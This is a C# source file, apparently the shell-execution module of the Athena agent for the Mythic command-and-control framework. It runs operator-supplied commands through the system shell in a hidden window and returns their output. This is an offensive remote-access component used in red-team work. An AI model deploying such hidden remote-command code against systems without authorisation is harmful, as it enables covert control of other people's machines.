using Athena.Mythic.Model;

using System;
using System.Diagnostics;

namespace Athena.Commands
{
    public class Execution
    {
        public static string ShellExec (MythicTask task)
        {
            //https://stackoverflow.com/questions/5718473/c-sharp-processstartinfo-start-reading-output-but-with-a-timeout
            //This may be why jobs don't call back when they return a lot of data.

            Process process = new Process();
            string shell, output;
            string parameters = task.parameters;

            //Env shows current shell

            if (OperatingSystem.IsMacOS() || OperatingSystem.IsLinux())
            {
                shell = Environment.GetEnvironmentVariable("SHELL");
                if (string.IsNullOrEmpty(shell))
                {
                    shell = "/bin/sh";
                }
                parameters = "-c " + parameters;
            }
            else if (OperatingSystem.IsWindows())
            {
                shell = Environment.GetEnvironmentVariable("ComSpec");
                if (string.IsNullOrEmpty(shell))
                {
                    shell = "cmd.exe";
                }
                parameters = "/C " + parameters;
            }
            else
            {
                return "Couldn't determine shell.";
            }
            process.StartInfo = new ProcessStartInfo()
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = shell,
                Arguments = parameters,
                RedirectStandardError = true,
                RedirectStandardOutput = true
            };
            try
            {
                process.Start();
                process.WaitForExit();
                if (process.ExitCode != 0)
                {
                    output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd();
                }
                else
                {
                    output = process.StandardOutput.ReadToEnd();
                }
                return output;
            }
            catch (Exception e)
            {
                output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd() + Environment.NewLine + e.Message;
                return output;
            }
        }
    }
}
